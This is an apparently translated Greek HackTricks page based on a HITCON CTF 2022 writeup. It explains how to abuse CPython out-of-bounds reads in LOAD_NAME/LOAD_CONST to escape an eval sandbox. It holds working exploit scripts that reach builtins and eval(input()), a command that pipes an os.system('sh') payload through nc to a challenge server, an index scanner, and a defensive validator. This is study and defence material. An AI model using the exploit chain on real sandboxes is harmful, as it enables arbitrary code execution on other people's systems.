# LOAD_NAME / LOAD_CONST opcode OOB Read

{{#include ../../../banners/hacktricks-training.md}}

**Αυτές οι πληροφορίες προέρχονται** [**από αυτό το writeup**](https://blog.splitline.tw/hitcon-ctf-2022/)**.**<sup>[[1]](#references)</sup>

### TL;DR <a href="#tldr-2" id="tldr-2"></a>

Μπορούμε να χρησιμοποιήσουμε τη δυνατότητα OOB read στα LOAD_NAME / LOAD_CONST opcode για να λάβουμε κάποιο symbol από τη μνήμη. Αυτό σημαίνει ότι μπορούμε να χρησιμοποιήσουμε ένα trick όπως το `(a, b, c, ... hundreds of symbol ..., __getattribute__) if [] else [].__getattribute__(...)` για να λάβουμε ένα symbol (όπως ένα όνομα function) που θέλουμε.

Στη συνέχεια, απλώς κατασκευάζουμε το exploit μας.

### Overview <a href="#overview-1" id="overview-1"></a>

Ο πηγαίος κώδικας είναι αρκετά σύντομος και περιέχει μόνο 4 γραμμές!
```python
source = input('>>> ')
if len(source) > 13337: exit(print(f"{'L':O<13337}NG"))
code = compile(source, '∅', 'eval').replace(co_consts=(), co_names=())
print(eval(code, {'__builtins__': {}}))1234
```
Μπορείς να εισαγάγεις αυθαίρετο Python code, το οποίο θα γίνει compile σε ένα [Python code object](https://docs.python.org/3/c-api/code.html). Ωστόσο, τα `co_consts` και `co_names` αυτού του code object θα αντικατασταθούν με ένα empty tuple πριν από το eval του code object.

Έτσι, οποιαδήποτε έκφραση περιέχει consts (π.χ. αριθμούς, strings κ.λπ.) ή names (π.χ. variables, functions) ενδέχεται τελικά να προκαλέσει segmentation fault.

### Out of Bound Read <a href="#out-of-bound-read" id="out-of-bound-read"></a>

Πώς συμβαίνει το segfault;

Ας ξεκινήσουμε με ένα απλό παράδειγμα: το `[a, b, c]` θα μπορούσε να γίνει compile στο ακόλουθο bytecode.
```
1           0 LOAD_NAME                0 (a)
2 LOAD_NAME                1 (b)
4 LOAD_NAME                2 (c)
6 BUILD_LIST               3
8 RETURN_VALUE12345
```
Αλλά τι γίνεται αν το `co_names` γίνει κενή πλειάδα; Το opcode `LOAD_NAME 2` εξακολουθεί να εκτελείται και προσπαθεί να διαβάσει την τιμή από τη διεύθυνση μνήμης στην οποία θα έπρεπε αρχικά να βρίσκεται. Ναι, αυτό είναι ένα out-of-bound read "feature".

Η βασική ιδέα για τη λύση είναι απλή. Ορισμένα opcodes στο CPython, όπως τα `LOAD_NAME` και `LOAD_CONST`, είναι ευάλωτα σε OOB read.

Ανακτούν ένα αντικείμενο από τον δείκτη `oparg` από την πλειάδα `consts` ή `names` (έτσι ονομάζονται εσωτερικά τα `co_consts` και `co_names`). Μπορούμε να ανατρέξουμε στο ακόλουθο σύντομο snippet σχετικά με το `LOAD_CONST`, για να δούμε τι κάνει το CPython όταν επεξεργάζεται το opcode `LOAD_CONST`.
```c
case TARGET(LOAD_CONST): {
PREDICTED(LOAD_CONST);
PyObject *value = GETITEM(consts, oparg);
Py_INCREF(value);
PUSH(value);
FAST_DISPATCH();
}1234567
```
Με αυτόν τον τρόπο μπορούμε να χρησιμοποιήσουμε το OOB feature για να πάρουμε ένα "name" από ένα αυθαίρετο memory offset. Για να βεβαιωθείτε ποιο name είναι και ποιο είναι το offset του, συνεχίστε να δοκιμάζετε `LOAD_NAME 0`, `LOAD_NAME 1` ... `LOAD_NAME 99` ... Και μπορεί να βρείτε κάτι περίπου στο oparg > 700. Φυσικά, μπορείτε επίσης να χρησιμοποιήσετε το gdb για να εξετάσετε το memory layout, αλλά δεν νομίζω ότι θα ήταν πιο εύκολο.

### Δημιουργία του Exploit <a href="#generating-the-exploit" id="generating-the-exploit"></a>

Μόλις ανακτήσουμε αυτά τα χρήσιμα offsets για names / consts, πώς _παίρνουμε_ ένα name / const από αυτό το offset και το χρησιμοποιούμε; Ακολουθεί ένα trick:\
Ας υποθέσουμε ότι μπορούμε να πάρουμε ένα `__getattribute__` name από το offset 5 (`LOAD_NAME 5`) με `co_names=()`. Τότε, απλώς κάνουμε τα εξής:
```python
[a,b,c,d,e,__getattribute__] if [] else [
[].__getattribute__
# you can get the __getattribute__ method of list object now!
]1234
```
> Σημειώστε ότι δεν είναι απαραίτητο να το ονομάσετε `__getattribute__`, μπορείτε να το ονομάσετε με κάτι πιο σύντομο ή πιο παράξενο

Μπορείτε να κατανοήσετε τον λόγο απλώς εξετάζοντας το bytecode του:
```python
0 BUILD_LIST               0
2 POP_JUMP_IF_FALSE       20
>>    4 LOAD_NAME                0 (a)
>>    6 LOAD_NAME                1 (b)
>>    8 LOAD_NAME                2 (c)
>>   10 LOAD_NAME                3 (d)
>>   12 LOAD_NAME                4 (e)
>>   14 LOAD_NAME                5 (__getattribute__)
16 BUILD_LIST               6
18 RETURN_VALUE
20 BUILD_LIST               0
>>   22 LOAD_ATTR                5 (__getattribute__)
24 BUILD_LIST               1
26 RETURN_VALUE1234567891011121314
```
Παρατηρήστε ότι το `LOAD_ATTR` ανακτά επίσης το όνομα από το `co_names`. Η Python φορτώνει τα ονόματα από το ίδιο offset όταν το όνομα είναι ίδιο, επομένως το δεύτερο `__getattribute__` εξακολουθεί να φορτώνεται από το offset=5. Χρησιμοποιώντας αυτήν τη δυνατότητα, μπορούμε να χρησιμοποιήσουμε οποιοδήποτε όνομα, μόλις το όνομα βρίσκεται στη nearby memory.

Για τη δημιουργία αριθμών:

- 0: not \[\[]]
- 1: not \[]
- 2: (not \[]) + (not \[])
- ...

### Exploit Script <a href="#exploit-script-1" id="exploit-script-1"></a>

Δεν χρησιμοποίησα consts λόγω του ορίου μήκους.

Αρχικά, ακολουθεί ένα script που βρίσκει για εμάς εκείνα τα offsets των ονομάτων.
```python
from types import CodeType
from opcode import opmap
from sys import argv


class MockBuiltins(dict):
def __getitem__(self, k):
if type(k) == str:
return k


if __name__ == '__main__':
n = int(argv[1])

code = [
*([opmap['EXTENDED_ARG'], n // 256]
if n // 256 != 0 else []),
opmap['LOAD_NAME'], n % 256,
opmap['RETURN_VALUE'], 0
]

c = CodeType(
0, 0, 0, 0, 0, 0,
bytes(code),
(), (), (), '<sandbox>', '<eval>', 0, b'', ()
)

ret = eval(c, {'__builtins__': MockBuiltins()})
if ret:
print(f'{n}: {ret}')

# for i in $(seq 0 10000); do python find.py $i ; done1234567891011121314151617181920212223242526272829303132
```
Και το ακόλουθο χρησιμοποιείται για τη δημιουργία του πραγματικού Python exploit.
```python
import sys
import unicodedata


class Generator:
# get numner
def __call__(self, num):
if num == 0:
return '(not[[]])'
return '(' + ('(not[])+' * num)[:-1] + ')'

# get string
def __getattribute__(self, name):
try:
offset = None.__dir__().index(name)
return f'keys[{self(offset)}]'
except ValueError:
offset = None.__class__.__dir__(None.__class__).index(name)
return f'keys2[{self(offset)}]'


_ = Generator()

names = []
chr_code = 0
for x in range(4700):
while True:
chr_code += 1
char = unicodedata.normalize('NFKC', chr(chr_code))
if char.isidentifier() and char not in names:
names.append(char)
break

offsets = {
"__delitem__": 2800,
"__getattribute__": 2850,
'__dir__': 4693,
'__repr__': 2128,
}

variables = ('keys', 'keys2', 'None_', 'NoneType',
'm_repr', 'globals', 'builtins',)

for name, offset in offsets.items():
names[offset] = name

for i, var in enumerate(variables):
assert var not in offsets
names[792 + i] = var


source = f'''[
({",".join(names)}) if [] else [],
None_ := [[]].__delitem__({_(0)}),
keys := None_.__dir__(),
NoneType := None_.__getattribute__({_.__class__}),
keys2 := NoneType.__dir__(NoneType),
get := NoneType.__getattribute__,
m_repr := get(
get(get([],{_.__class__}),{_.__base__}),
{_.__subclasses__}
)()[-{_(2)}].__repr__,
globals := get(m_repr, m_repr.__dir__()[{_(6)}]),
builtins := globals[[*globals][{_(7)}]],
builtins[[*builtins][{_(19)}]](
builtins[[*builtins][{_(28)}]](), builtins
)
]'''.strip().replace('\n', '').replace(' ', '')

print(f"{len(source) = }", file=sys.stderr)
print(source)

# (python exp.py; echo '__import__("os").system("sh")'; cat -) | nc challenge.server port
12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273
```
Ουσιαστικά κάνει τα εξής, για εκείνες τις συμβολοσειρές που λαμβάνουμε από τη μέθοδο `__dir__`:
```python
getattr = (None).__getattribute__('__class__').__getattribute__
builtins = getattr(
getattr(
getattr(
[].__getattribute__('__class__'),
'__base__'),
'__subclasses__'
)()[-2],
'__repr__').__getattribute__('__globals__')['builtins']
builtins['eval'](builtins['input']())
```
---

### Σημειώσεις έκδοσης και επηρεαζόμενα opcodes (Python 3.11–3.13)

- Τα opcodes του CPython εξακολουθούν να χρησιμοποιούν integer operands για indexing στα tuples `co_consts` και `co_names`. Αν ένας attacker μπορέσει να εξαναγκάσει αυτά τα tuples να είναι κενά (ή μικρότερα από το μέγιστο index που χρησιμοποιείται από το bytecode), ο interpreter θα διαβάσει μνήμη εκτός ορίων για το συγκεκριμένο index, επιστρέφοντας έναν αυθαίρετο δείκτη PyObject από κοντινή μνήμη. Τα σχετικά opcodes περιλαμβάνουν τουλάχιστον τα εξής:
- `LOAD_CONST consti` → διαβάζει το `co_consts[consti]`.
- `LOAD_NAME namei`, `STORE_NAME`, `DELETE_NAME`, `LOAD_GLOBAL`, `STORE_GLOBAL`, `IMPORT_NAME`, `IMPORT_FROM`, `LOAD_ATTR`, `STORE_ATTR` → διαβάζουν names από το `co_names[...]` (για τις εκδόσεις 3.11+ σημειώστε ότι τα `LOAD_ATTR`/`LOAD_GLOBAL` αποθηκεύουν flag bits στο low bit· το πραγματικό index είναι `namei >> 1`). Δείτε το disassembler docs για την ακριβή σημασιολογία ανά έκδοση. [Python dis docs].<sup>[[2]](#references)</sup>
- Οι εκδόσεις Python 3.11+ εισήγαγαν adaptive/inline caches, οι οποίες προσθέτουν κρυφές καταχωρίσεις `CACHE` ανάμεσα στις εντολές. Αυτό δεν αλλάζει το OOB primitive· σημαίνει μόνο ότι, αν δημιουργείτε bytecode χειροκίνητα, πρέπει να συνυπολογίσετε αυτές τις cache entries κατά τη δημιουργία του `co_code`.

Πρακτική συνέπεια: η τεχνική σε αυτή τη σελίδα εξακολουθεί να λειτουργεί στα CPython 3.11, 3.12 και 3.13 όταν μπορείτε να ελέγξετε ένα code object (π.χ. μέσω του `CodeType.replace(...)`) και να μικρύνετε τα `co_consts`/`co_names`.

### Γρήγορος scanner για χρήσιμα OOB indexes (συμβατός με 3.11+/3.12+)

Αν προτιμάτε να αναζητάτε ενδιαφέροντα objects απευθείας από bytecode αντί από high-level source, μπορείτε να δημιουργήσετε minimal code objects και να κάνετε brute force σε indexes. Το παρακάτω helper εισάγει αυτόματα inline caches όπου χρειάζεται.
```python
import dis, types

def assemble(ops):
# ops: list of (opname, arg) pairs
cache = bytes([dis.opmap.get("CACHE", 0), 0])
out = bytearray()
for op, arg in ops:
opc = dis.opmap[op]
out += bytes([opc, arg])
# Python >=3.11 inserts per-opcode inline cache entries
ncache = getattr(dis, "_inline_cache_entries", {}).get(opc, 0)
out += cache * ncache
return bytes(out)

# Reuse an existing function's code layout to simplify CodeType construction
base = (lambda: None).__code__

# Example: probe co_consts[i] with LOAD_CONST i and return it
# co_consts/co_names are intentionally empty so LOAD_* goes OOB

def probe_const(i):
code = assemble([
("RESUME", 0),          # 3.11+
("LOAD_CONST", i),
("RETURN_VALUE", 0),
])
c = base.replace(co_code=code, co_consts=(), co_names=())
try:
return eval(c)
except Exception:
return None

for idx in range(0, 300):
obj = probe_const(idx)
if obj is not None:
print(idx, type(obj), repr(obj)[:80])
```
Σημειώσεις
- Για να διερευνήσετε names αντί γι' αυτό, αντικαταστήστε το `LOAD_CONST` με `LOAD_NAME`/`LOAD_GLOBAL`/`LOAD_ATTR` και προσαρμόστε ανάλογα τη χρήση του stack.
- Χρησιμοποιήστε `EXTENDED_ARG` ή πολλά bytes του `arg` για να φτάσετε σε indexes >255, εάν χρειάζεται. Κατά τη δημιουργία με `dis`, όπως παραπάνω, ελέγχετε μόνο το low byte· για μεγαλύτερα indexes, κατασκευάστε τα raw bytes μόνοι σας ή διαχωρίστε την attack σε πολλαπλά loads.

### Minimal bytecode-only RCE pattern (co_consts OOB → builtins → eval/input)

Μόλις εντοπίσετε ένα `co_consts` index που επιλύεται στο builtins module, μπορείτε να ανακατασκευάσετε το `eval(input())` χωρίς κανένα `co_names`, χειριζόμενοι το stack:
```python
# Build co_code that:
# 1) LOAD_CONST <builtins_idx> → push builtins module
# 2) Use stack shuffles and BUILD_TUPLE/UNPACK_EX to peel strings like 'input'/'eval'
#    out of objects living nearby in memory (e.g., from method tables),
# 3) BINARY_SUBSCR to do builtins["input"] / builtins["eval"], CALL each, and RETURN_VALUE
# This pattern is the same idea as the high-level exploit above, but expressed in raw bytecode.
```
Αυτή η προσέγγιση είναι χρήσιμη σε challenges που σας δίνουν άμεσο έλεγχο του `co_code`, ενώ επιβάλλουν `co_consts=()` και `co_names=()` (π.χ. το “awpcode” του BCTF 2024). Αποφεύγει τα source-level tricks και διατηρεί το μέγεθος του payload μικρό, αξιοποιώντας bytecode stack ops και tuple builders.

### Αμυντικοί έλεγχοι και mitigations για Sandboxes

Αν γράφετε ένα Python “sandbox” που κάνει compile/evaluate untrusted code ή τροποποιεί code objects, μην βασίζεστε στο CPython για τον έλεγχο ορίων των tuple indexes που χρησιμοποιούνται από το bytecode. Αντίθετα, επικυρώνετε οι ίδιοι τα code objects πριν από την εκτέλεσή τους.

Πρακτικός validator (απορρίπτει OOB access στα co_consts/co_names)
```python
import dis

def max_name_index(code):
max_idx = -1
for ins in dis.get_instructions(code):
if ins.opname in {"LOAD_NAME","STORE_NAME","DELETE_NAME","IMPORT_NAME",
"IMPORT_FROM","STORE_ATTR","LOAD_ATTR","LOAD_GLOBAL","DELETE_GLOBAL"}:
namei = ins.arg or 0
# 3.11+: LOAD_ATTR/LOAD_GLOBAL encode flags in the low bit
if ins.opname in {"LOAD_ATTR","LOAD_GLOBAL"}:
namei >>= 1
max_idx = max(max_idx, namei)
return max_idx

def max_const_index(code):
return max([ins.arg for ins in dis.get_instructions(code)
if ins.opname == "LOAD_CONST"] + [-1])

def validate_code_object(code: type((lambda:0).__code__)):
if max_const_index(code) >= len(code.co_consts):
raise ValueError("Bytecode refers to const index beyond co_consts length")
if max_name_index(code) >= len(code.co_names):
raise ValueError("Bytecode refers to name index beyond co_names length")

# Example use in a sandbox:
# src = input(); c = compile(src, '<sandbox>', 'exec')
# c = c.replace(co_consts=(), co_names=())       # if you really need this, validate first
# validate_code_object(c)
# eval(c, {'__builtins__': {}})
```
Ιδέες για επιπλέον mitigation
- Μην επιτρέπετε αυθαίρετη χρήση του `CodeType.replace(...)` με untrusted input ή προσθέστε αυστηρούς ελέγχους δομής στο resulting code object.
- Εξετάστε το ενδεχόμενο εκτέλεσης untrusted code σε ξεχωριστή διεργασία με sandboxing σε επίπεδο OS (seccomp, job objects, containers), αντί να βασίζεστε στη σημασιολογία του CPython.

## References

- [1] [Το writeup της Splitline για το HITCON CTF 2022 "V O I D" (η προέλευση αυτής της τεχνικής και η αλυσίδα exploit υψηλού επιπέδου)](https://blog.splitline.tw/hitcon-ctf-2022/)
- [2] [Τεκμηρίωση του Python disassembler (σημασιολογία των indices για τα LOAD_CONST/LOAD_NAME/etc. και τα low-bit flags των `LOAD_ATTR`/`LOAD_GLOBAL` στην 3.11+)](https://docs.python.org/3.13/library/dis.html)

{{#include ../../../banners/hacktricks-training.md}}
